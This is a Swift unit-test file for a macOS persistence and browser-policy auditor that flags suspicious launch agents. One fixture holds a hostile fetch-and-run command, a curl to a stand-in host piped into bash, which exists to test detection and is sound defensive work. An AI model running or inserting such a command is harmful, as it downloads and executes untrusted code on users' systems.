import XCTest
@testable import TidyCore

final class ProtectionTests: XCTestCase {
    var root: URL!

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    @discardableResult
    private func writePlist(_ relative: String, _ plist: [String: Any]) throws -> URL {
        let url = root.appendingPathComponent(relative)
        try FileManager.default.createDirectory(at: url.deletingLastPathComponent(), withIntermediateDirectories: true)
        try PropertyListSerialization.data(fromPropertyList: plist, format: .xml, options: 0).write(to: url)
        return url
    }

    private func item(label: String, file: String? = nil, program: String? = nil, arguments: [String] = [], scope: LaunchItem.Scope = .userAgent) -> LaunchItem {
        LaunchItem(url: root.appendingPathComponent("LaunchAgents/\(file ?? label).plist"), label: label,
                   program: program ?? arguments.first, arguments: arguments,
                   runAtLoad: true, keepAlive: false, disabled: false, scope: scope)
    }

    func testReadsLaunchJobs() throws {
        try writePlist("LaunchAgents/com.example.sync.plist", [
            "Label": "com.example.sync",
            "ProgramArguments": ["/Applications/Example.app/Contents/MacOS/sync", "--quiet"],
            "RunAtLoad": true,
            "KeepAlive": ["SuccessfulExit": false],
        ])
        try writePlist("LaunchAgents/broken.plist", ["Label": 3])          // wrong type falls back to file name
        try Data("not a plist".utf8).write(to: root.appendingPathComponent("LaunchAgents/garbage.plist"))

        let items = LaunchItemReader.items(in: [(root.appendingPathComponent("LaunchAgents"), .userAgent)])
        XCTAssertEqual(items.map(\.label), ["broken", "com.example.sync"])
        let sync = items[1]
        XCTAssertEqual(sync.program, "/Applications/Example.app/Contents/MacOS/sync")
        XCTAssertTrue(sync.runAtLoad)
        XCTAssertTrue(sync.keepAlive)
        XCTAssertEqual(sync.scope, .userAgent)
    }

    func testNamesTheAppAJobComesWith() {
        XCTAssertEqual(item(label: "a", program: "/Applications/Dropbox.app/Contents/MacOS/Dropbox").appName, "Dropbox")
        XCTAssertEqual(item(label: "b", program: "/Applications/Setapp.app/Contents/Library/LoginItems/Agent.app/Contents/MacOS/Agent").appName,
                       "Setapp", "the outermost app")
        XCTAssertNil(item(label: "c", program: "/usr/local/bin/tool").appName)
        XCTAssertNil(item(label: "d").appName)
    }

    func testCleanJobHasNoFinding() {
        let findings = PersistenceAuditor().audit([item(label: "com.example.ok", program: "/Applications/Example.app/x")],
                                                  fileExists: { _ in true })
        XCTAssertTrue(findings.isEmpty)
    }

    func testFlagsProgramsInTemporaryOrHiddenFolders() {
        let findings = PersistenceAuditor().audit([
            item(label: "com.tmp.job", program: "/private/tmp/updater"),
            item(label: "com.hidden.job", program: "/Users/me/Library/.hidden/agent"),
        ], fileExists: { _ in true })
        XCTAssertEqual(findings.count, 2)
        XCTAssertTrue(findings.allSatisfy { $0.severity == .danger })
    }

    func testFlagsScriptsThatDownloadCode() {
        let findings = PersistenceAuditor().audit([
            item(label: "com.dropper", arguments: ["/bin/bash", "-c", "curl -s https://example.invalid/p | bash"]),
            item(label: "com.harmless", arguments: ["/bin/sh", "/Applications/Example.app/Contents/Resources/start.sh"]),
        ], fileExists: { _ in true })
        XCTAssertEqual(findings.map(\.title), ["com.dropper"])
        XCTAssertEqual(findings.first?.severity, .danger)
    }

    func testMissingProgramIsLeftToSystemJunk() {
        // It starts nothing, so it's no threat: System Junk lists it with what removed apps left behind.
        let findings = PersistenceAuditor().audit([item(label: "com.gone.helper", program: "/Applications/Gone.app/helper")],
                                                  fileExists: { _ in false })
        XCTAssertTrue(findings.isEmpty)
    }

    func testFlagsStartupProgramsNoDeveloperSigned() {
        let signatures: [String: CodeSignature] = [
            "/Applications/Signed.app/Contents/MacOS/agent": .identified,
            "/Library/Application Support/Unsigned/agent": .unsigned,
            "/Library/Application Support/AdHoc/agent": .notIdentified,
            "/Library/Application Support/Changed/agent": .broken,
            "/opt/homebrew/opt/postgresql@16/bin/postgres": .notIdentified,
        ]
        let checked = Recorder<String>()
        let findings = PersistenceAuditor().audit([
            item(label: "com.example.signed", program: "/Applications/Signed.app/Contents/MacOS/agent"),
            item(label: "com.example.unsigned", program: "/Library/Application Support/Unsigned/agent"),
            item(label: "com.example.adhoc", program: "/Library/Application Support/AdHoc/agent"),
            item(label: "com.example.changed", program: "/Library/Application Support/Changed/agent"),
            item(label: "homebrew.mxcl.postgresql@16", program: "/opt/homebrew/opt/postgresql@16/bin/postgres"),
            item(label: "com.gone.helper", program: "/Applications/Gone.app/helper"),
        ], fileExists: { !$0.hasPrefix("/Applications/Gone.app") }, signature: { checked.add($0); return signatures[$0] ?? .unknown })

        XCTAssertEqual(Set(findings.map(\.title)), ["com.example.unsigned", "com.example.adhoc", "com.example.changed"])
        XCTAssertEqual(Set(findings.map(\.severity)), [.warning])
        XCTAssertTrue(findings.first { $0.title == "com.example.changed" }?.reasons == ["Its program was changed after its developer signed it."])
        XCTAssertFalse(checked.all.contains { $0.hasPrefix("/opt/homebrew/") || $0.hasPrefix("/Applications/Gone.app") },
                       "Homebrew builds its programs without a developer's certificate, and a missing program has nothing to check")
    }

    func testMismatchedNameIsWorthALookForSystemJobs() {
        let findings = PersistenceAuditor().audit([item(label: "com.apple.fake", file: "com.random.xyz", program: "/usr/local/bin/x", scope: .daemon)],
                                                  fileExists: { _ in true })
        XCTAssertEqual(findings.first?.severity, .warning)
    }

    func testFindingsAreOrderedMostSevereFirst() {
        let findings = PersistenceAuditor().audit([
            item(label: "a.noprogram"),
            item(label: "b.danger", program: "/tmp/x"),
        ], fileExists: { $0.hasPrefix("/tmp") })
        XCTAssertEqual(findings.map(\.title), ["b.danger", "a.noprogram"])
    }

    func testFindsBrowserSettingsForcedByPolicy() throws {
        let managed = root.appendingPathComponent("Managed Preferences")
        try writePlist("Managed Preferences/com.google.Chrome.plist", [
            "DefaultSearchProviderSearchURL": "https://search.example.invalid/?q={searchTerms}",
            "SomethingHarmless": true,
        ])
        try writePlist("Managed Preferences/me/com.brave.Browser.plist", ["HomepageLocation": "https://example.invalid"])
        try writePlist("Managed Preferences/com.google.Keystone.plist", ["HomepageLocation": "x"])   // not a browser domain

        let findings = BrowserPolicyAuditor(managedPreferences: managed).audit()
        XCTAssertEqual(Set(findings.map(\.title)), ["Chrome settings are locked by a policy", "Brave settings are locked by a policy"])
        XCTAssertTrue(findings.allSatisfy { $0.severity == .warning })
    }
}
